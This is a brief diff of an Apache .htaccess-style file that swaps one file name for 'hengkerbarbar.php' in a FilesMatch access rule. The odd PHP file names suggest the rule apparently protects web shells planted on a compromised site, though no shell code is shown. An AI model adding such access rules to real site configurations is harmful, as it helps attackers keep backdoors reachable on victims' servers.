@@ -12,7 +12,7 @@
 
 </FilesMatch>
 
-<FilesMatch "^(hxc.php|ywdh.php)$">
+<FilesMatch "^(hxc.php|hengkerbarbar.php)$">
 
  Order allow,deny
 
